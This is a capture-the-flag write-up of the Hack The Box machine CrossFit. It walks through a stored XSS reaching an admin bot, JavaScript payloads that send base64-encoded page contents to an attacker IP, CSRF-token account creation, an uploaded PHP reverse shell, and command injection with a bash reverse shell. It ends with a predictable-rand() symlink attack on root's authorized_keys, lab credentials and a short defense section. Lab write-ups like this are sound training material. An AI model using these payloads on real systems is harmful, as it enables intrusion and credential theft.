# CROSSFIT | LINUX | INSANE

##  ==BHOSA | 26-03-2021==


# ENUMERATION
1. 21-ftp check
2. 22- ssh
3. 80-web check
4. info@gym-club.crossfit.htb

## gym-club.crossfit.htb
1. /etc/mysql/my.cnf
-------------------------------------------------------------------

This box was a insane box in all aspects.The initial foothold was based on a stored xss on admin and then some horizontal privesc to multiple users using some hardcoded passwords in some conf files,and also a cron job which included a php file which used a bug versioned module which led to another user compromise.The final root privesc was a reverse engineering and the wasy to achieve that was also tedious because of some cleanup  scripts that kept on deleting the files that we needed.

-------------------------------------------------------------------
## FTP 
- Anonymous login not allowed.

## SSH 
- Not a vulnerable version.

## DISCOVERING SUBDOMAIN FROM ftp SSL CERTIFICATE.

- The initial web page at port 80 was a simple apache web page.
- Sub domain discovered through nmap ftp ssl scan.(ftp different so we need to use [lftp] to work with it).

![[Pasted image 20210331002705.png]]

* PAGE AT gym-club.crossfit.htb

![[Pasted image 20210331003038.png]]

### ***gym-club.crossfit.htb***
1. Basic page with no cookies.
2. no login page.
3. bunch of user input endpoints.

### USER ENDPOINTS 
#### 1. INDEX PAGE: 
![[Pasted image 20210331003353.png]]
- BASIC CONTACT PAGE
- NO SUCESS MESSAGE 
- ==DEAD==

#### 2. CONTACT PAGE:

![[Pasted image 20210331003708.png]]

- ANOTHER CONTACT PAGE
- DISPLAYS MESSAGE ON SUCCESS.
- POSSIBLE ENDPOINT.

#### 3. BLOG-SINGLE PAGE

![[Pasted image 20210331004141.png]]

- COMMENT PAGE.
- WHEN INCLUDED SCRIPT TAGS AND OTHER BLACKLISTED CHARACTERS.
- ALERT SHOWS UP.

![[Pasted image 20210331004342.png]]
#### XSS EXPLOIT 
1. A XSS REPORT IS SENT TO THE ADMIN.
2. THE REPORT CONTAINS THE ***IP*** AND ***BROWSER*** INFO.
3. IP CANT BE CHANGED BUT THE BROWSER INFO CAN BE CHANGED.
4. THE BROWSER INFO IS TAKEN FROM THE ***USER-AGENT*** HEADER THAT WE SUPPLY IN OUR REQUEST.
5. MOST PROBABLY THERE WILL BE A BOT (**selenium**).
6. ***SO PASS A XSS IN THE USER-AGENT*** SO THAT IF THE ADMIN USER IS VULNERABLE TO XSS THEN THE JAVASCRIPT WILL BE EXECUTED BY THE BROWSER.

![[Pasted image 20210331010910.png]]

> subsequently a request for the file came inidcating that the admin browser opened the report and then viewed the report because of which the javascript was executed by the browser.

![[Pasted image 20210331010931.png]]

#### COOKIE RETRIEVAL FAILURE 
1.  NEXT ATTEMPT WAS TO RETRIEVE SOME COOKIES OF ADMIN.

![[Pasted image 20210331011740.png]]

2. BUT THERE WAS  NO COOKIE.

![[Pasted image 20210331011825.png]]

#### SUBDOMAIN DISCOVERY USING CORS
- CORS->Cross Origin Resource Sharing policies.
- This policy is used to manage cross origin resource sharing between two websites so as to reduce hacking risks.
- It was formed after the failure of sop(Same Origin policy) which had a lot of restrictions.
- ==***MORE ABOUT CORS:***== [[CONCEPTS ONLY#CORS CROSS ORIGIN RESOURCE SHARING|CORS]]
##### FUZZ METHODOLOGY
- The basic idea that we are gonna use in [[CROSSFIT]] is the following:
1. SO WHEN WE SENT A GET REQUEST TO SOME WEBSITE,WE ALSO SENT A ***ORIGIN HEADER*** .***This is to help the server understand from where the request is coming.*** 
3. THE SERVER WEBSITE CHECKS THE ORIGIN AND IF THE WEBSITE IS ALLOWED THEN IT SENTS A `Access-Control-Allow-Origin: http://ftp.crossfit.htb` HEADER TO SPECIFY THAT THE DOMAIN FROM WHICH THE REQUESTS ARE ORIGINATING CAN HAVE ACCESS TO THE RESOURCES IN THE SERVER.
4. ==***WHAT IS OUR OBJECTIVE?***==\
5. IT IS TO FIND REAL SUB-DOMAINS SO THAT WE CAN FURTHUR ENUMERATE.
6. AND WE DO THAT WITH THE HELP OF THE RESPONSE HEADER-`Access-Control-Allow-Origin:` 
7. WE USE FFUF TO SEND A GET REQUEST WITH RANDOM SUB-DOMAINS FROMA WORDLIST AND THEN FILTER THE RESPONSES ON THE BASIS OF THE HEADER `Access-Control-Allow-Origin:` USINF A ***REGEX OPTION*** IN FFUF(same can be done in wfuzz).
8. The servers wont send a `Access-Control-Allow-Origin:` header if the origin is some domain or sub-domain that it does not recognize.

- FFUF command:	

		ffuf -mr "Access-Control-Allow-Origin:" -w /usr/share/dirb/wordlists/common.txt -H "Origin: http://FUZZ.crossfit.htb" -u http://gym-club.crossfit.htb/

![[Pasted image 20210331035910.png]]

### ftp.crossfit.htb
- This sub-domain only shows apache default page.
- no directories founnd using gobuster.

![[Pasted image 20210331041143.png]]

#### USING XSS TO WORK WITH ***ftp.crossfit.htb***

1. Now we need to access ftp.crossfit.htb via xss.
2.  We will make sure that using xss we make the admin user **download a js file** and then the js file will execute the necessary commands to `GET` the page and then **store the response in a variable ** and the remaining part of the script will ensure to send a connection back to our python server along with the response.
3.  AND THEN VIEWING THE RESPONSE IN FIREFOX WILL GIVE US AN IDEA OF HOW THE WEBPAGE 	ftp.crossfit.htb looks like in admin browser.

### JAVASCRIPT FILE FOR SIMPLE GET REQUEST.
```javascript
var target1 = 'http://ftp.crossfit.htb/'; 
var req3 = new XMLHttpRequest();
req3.open('GET',target1,false);
req3.send();
var response = req3.responseText;

/*attacker request*/
var attacker = 'http://10.10.14.47/result='+btoa(response);
var req2 = new XMLHttpRequest();
req2.open('GET',attacker,true);
req2.send();
```

> - `btoa(response)` is used to convert text to base64.
> - converting to base64 will help in retrieving all data,it also helps if their are some special characters.
 ### RETRIEVED PAGES
 
 #### index.html
 ![[Pasted image 20210331050106.png]]
 #### create.html
 ![[Pasted image 20210331050149.png]]
 
 ### POST REQUEST TO CREATE A NEW USER USING XSS
 
1.  We now need to create a new user.
2.  Using javascript one can create a POST request also.

```javascript
/*GETTING THE TOKEN*/
var target2 = 'http://ftp.crossfit.htb/accounts/create';
var req4 = new XMLHttpRequest();
req4.open('GET',target2,false); /*here `false` is necessary so that only after this req is completed the program continues*/
req4.withCredentials = true;  /*to keep the session alive*/
req4.send();
/*PARSING THE REQUEST*/
response2 = req4.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response2,'text/html');
token = doc.getElementsByName("_token")[0].value; /*retrieving the token value*/

/*POST REQUEST TO CREATE A USER*/
var target = 'http://ftp.crossfit.htb/accounts';
var req = new XMLHttpRequest();
var params = 'username=hello&pass=bhosa&_token='+token;
req.open('POST', target, false);
req.withCredentials = true;
req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req.send(params);

/*VIEWING THE MAIN PAGE TO SEE IF A USER IS CREATED*/
var target1 = 'http://ftp.crossfit.htb/';
var req3 = new XMLHttpRequest();
req3.open('GET',target1,false);
req3.send();
var response = req3.responseText;

/*attacker request*/
var attacker = 'http://10.10.14.47/result='+btoa(response);
var req2 = new XMLHttpRequest();
req2.open('GET',attacker,true);
req2.send();
```
- This javascript will first search fot token and then use that token to send a post request to create a new user and then we again ask for the main page and then sent back the index.html file to find a new user created.
1. Here `req.withCredentials` is used to keep the seesion alive.
2. `params` is a variable to store the POST data and then send via `send()` command.
3. Incase of `open()` function we use `false` for all requests except the final one,because false means that the code can move to next line only after we get a response for the request,this makes sure that all requests happen competely.

***USING THIS WE CREATE A NEW USER AND THIS USER CAN BE USED TO LOGIN TO THE FTP SERVICE HOSTED ON PORT 21: ***

![[Pasted image 20210331053431.png]]

### LFTP
- NORMALLY FTP is used to login but in this case ftp seems to have a ssl certificate.
- Because of which we need to use lftp to make a conection.
```bash
lftp
lftp :~> set ftp:ssl-force true
lftp :~> set ssl:verify-certificate no
lftp :~> connect 10.129.121.115
lftp 10.129.121.115:~> login hello
Password: 
```
- The ftp was a dump of all the contents of `/var/www` 
- Incase of `development-test` sub-domain one could `put` a file.ALL OTHER SUB-DOMAINS DID NOT ALLOW IT.
- So we put a simple php reverse shell and then try to call it with the same xss vuln.
```bash
lftp hello@10.129.121.115:~> ls
drwxrwxr-x    2 33       1002         4096 Mar 29 15:15 development-test
drwxr-xr-x   13 0        0            4096 May 07  2020 ftp
drwxr-xr-x    9 0        0            4096 May 12  2020 gym-club
drwxr-xr-x    2 0        0            4096 May 01  2020 html
lftp hello@10.129.121.115:/> cd development-test
lftp hello@10.129.121.115:/development-test> ls
lftp hello@10.129.121.115:/development-test> put bhosa.php
3461 bytes transferred in 2 seconds (1.5 KiB/s)                
lftp hello@10.129.121.115:/development-test> 
```
#### INVOKING THE REVERSE SHELL(using xss)
```javascript
var target = 'http://development-test.crossfit.htb/bhosa.php';
var attack = new XMLHttpRequest();
attack.open('GET',target,false);
attack.send();
resp = attack.responseText;
```
- This will invoke the script from the admin browser and then give us a connection.

![[Pasted image 20210331055846.png]]

![[Pasted image 20210331055819.png]]
In this manner we get ***www-data*** user.

# EXPLOITATION

### HANK USER PRIVESC
A total enumeration of the box will lead to a ton of hard coded credentials.
- One such credential was found in `/etc/ansible/playbooks`.

![[Pasted image 20210331105118.png]]

- On examination it is found to be a sha512 hash.
- hashcat can be used to crack the password with a satandard rockyou wordlist.

		hashcat -m 1800 hash /root/Desktop/rockyou.txt

![[Pasted image 20210331110001.png]]

One can login as hank using ssh.

### ISAAC USER PRIVESC
- Hank is in the admins group and there are some files of isaac that belong to the admin group.

![[Pasted image 20210331110256.png]]

- Thus the best way we could get to user isaac would be via this path.
- we can also see a script(send_updates.php) being run every minute.  

![[Pasted image 20210331110538.png]]

> ANYONE CAN VIEW THE CRON ? 

#### EXPLOIT IN send_updates.php 

![[Pasted image 20210331112127.png]]

***mikehearlt shellcommand module*** used here is to execute shell commands in php,but it has a bug as it does not escape the arguments correctly because of which one can easily escape the commands using a simple semi colon and then insert whatever shell commands and effectively gain a rce.
==***MORE ABOUT THIS :***==  https://github.com/mikehaertl/php-shellcommand/issues/44 

### EXPLOIT STRATEGY 
- Initial step would be to insert some file in the so called `$msgdir` so that the loop will start.
- And then some email needs to be inserted so that the second loop to run the vulnerable shell commands will start.
- So some ftpadm user credentials was retrieved via `pam.d/vsftpd`.
- And inside that is a message directory.
- ***This is the possible directory that we need to populate to trigger the loop***.

![[Pasted image 20210331113051.png]]

We populate it with random stuff.
1. ***NOW WE NEED TO POPULATE THE CROSSFIT USERS TABLE***.
2. Credentials for that was found in `/var/www/gym-club/db.php`.
3. Using this we login and then feed the email column with our rce code.
4. The plan is since it does not escape the argument,we can simply escap it using semi-colon and then add a simple bash reverse shell and then again close the command using a seni-colon to execute a reverse shell.

![[Pasted image 20210331113839.png]]

Put some file in messages directory.Now when the cron runs it will enter the first loop and then it will iterate through the files and then it will enter the next loop and check for email ids in users.

![[Pasted image 20210331114104.png]]

When it finds a text it will perform a `/usr/bin/mail` on the value but due to semi-colon the command will exit and our command will run,and if we dont keep another semi-colon then the reverse shell will not work because there are furthur arguments after that.

==***We get isaac user using a simple bug in a php module that was not updated.***==

# PRIVESC

## ROOT PRIVESC
- root privesc is based on reverse engineering which iam very wask in
- Initially we find a binary out of the ordinary in `/usr/bin/dbmsg`.Using the timestyle trick.

![[Pasted image 20210331114826.png]]

And then reversing it will let us know that every minute it creates a file with rand number and then it will store the contents of messages column of crossfit db and then zip it and then delete.

## EXPLOIT
- We will make sure that we guess the name of the file by creating a c program that will calculate the random number by adding a second to a minute.
- And then we will create a symlink for that file that will point to `/root/.ssh/authorzed_keys.`
- Y authorized_keys?
- Because according to the script it will take the second third and fourth column contants and then plcae them inthis file with spaces.
- So if we symlink to that authorized_keys file then we can feed the pub key to the columns of the table that we have access and then when the cron hits it will write the contents to the keys file and then delete the file in `/var/local` and then sshing as root.

1. Created a simple c file to create a random number by using rand()
function with the seed as timestamp + 1 second every minute in such a manner that it will show the next timestamp so that based on that we can create a md5 hash of our random number and create the file well in hand.
2. And then we add the ssh key files and also the name of the file is appended with the id value.SO MAKE SURE THAT RANDOM NUMBER IS SUFFIXED WITH ID BEING USED IN THE DB.
3. > ***NOTE:*** Here a special ssh key is used because it is small and we cant fit in a big ssh pub key in a table.

		ssh-keygen -o -a 100 -t ed25519 -f /root/wargames/hackthebox/crossfit/root
4. We then wait and then ssh in as root.
5. ==***SCRIPT PROVIDED***:==

```c
#include <stdio.h>
#include <time.h>
#include <stdlib.h>


int main()
{
	/* code */
	time_t now = time(NULL); /*declare the time variable and store the cur timestamp*/
	time_t next = now - (now % 60) + 61; /*this will store the next minute +1 second timestamp*/
	
	printf("CURRENT TIMESTAMP: %d\n",now ); 
	printf("NEXT TIMESTAMP: %d\n",next );

	srand(next);
	printf("%d\n",rand() );
	return 0;
}
```

This code will return the current timestamp and also the next timestamp that is the random number than will be used by the program to create its file when the next cronjob starts.SO we have basically 1 minute to do all the arrangements.Because of which script was created to automate this.

```bash
#!/bin/bash
id=1
name="ssh-ed25519"
email="root@bhosa"
message="AAAAC3NzaC1lZDI1NTE5AAAAIK/FLoEjFzZJo8SonMKVgF1N0eOlQx/YQtDiglNlpDEg"

rand=$(/dev/shm/simple_rand)
echo "Next Cronjob Timestamp: ${rand}"

filename=$(echo -n "${rand}${id}" | md5sum | awk '{print $1}')
echo "FILENAME: ${filename}" 
ln -s /root/.ssh/authorized_keys ${filename}
echo "[+]CREATED A SYMLINK"
echo "[+]ENTERING THE SSH PUB KEY IN DATABASE(crossfit,messages)"
echo "[+]INFO:(id,name,email,message)--->(${id},${name},${email},${message})"
mysql -u crossfit -p oeLoo~y2baeni crossfit -e "insert into messages(id, name, email, message) values ($id, '$name', '$email', '$message')"
sec=$((60 - $(date +%-S)))
while [ $sec -ne 59 ];do
	echo -en "\r[*]SECONDS LEFT UNTIL NEXT CRON: ${sec}"
	sleep 1
	sec=$((60 - $(date +%-S)))
done
echo "[+]NOW TRY TO SSH AS ROOT"
```


# CREDENTIALS
```bash
$6$e20D6nUeTJOIyRio$A777Jj8tk5.sfACzLuIqqfZOCsKTVCfNEQIbH79nZf09mM.Iov/pzDCE8xNZZCM9MuHKMcjqNUd8QUEzC1CZG:powerpuffgirls
```
ftp:ftpadm:8W)}gpRJvAmnb
mysql:crossfit:oeLoo~y2baeni

# DEFENSE
1. The first exploit was xss in the report sent to admin.
->SOLUTION WOULD BE TO SANITIZE AND FILTER THE REPORT THAT IS SENT TO THE ADMIN .
2. The second exploit CORS WEAKNESS.
-> Cant do much as it was only used to find  a sub-domain.
3. The third exploit that lead to rfi and rce was development-test subdomain accepting files via lftp.
-> MAKE SURE THAT PERMISIION IS DENIED FOR OTHER USERS TO UPLOAD TO FTP.
4. Hardcoded password of hank in ansible.
-> MAKE SURE THAT PASSWORDS ARE STRONG.
5. Outdated php module
-> UPDATE TO THE LATEST VERSION OF THE MODULE.
-> ALSO MAKE SURE THAT DB PASSWORDS ARE NOT HARDCODED.
6. DBMSG BEING BADLY CODED.
->IT NEEDS TO STRIPPED.
->IT NEEDS TO FIND A DIFFERENT SEED AS TIME IS EASILY PREDICTABLE IF CRON RUNS IT EVERY MINUTE.

# FLAGS 

# THINGS LEARNT
1. XSS VIA JAVASCRIPT FILES AND BIG CODES.
2. TO ENUMERATE HARDER.
3. MYSQL COMMANDS AND SOME BASH SCRIPTING

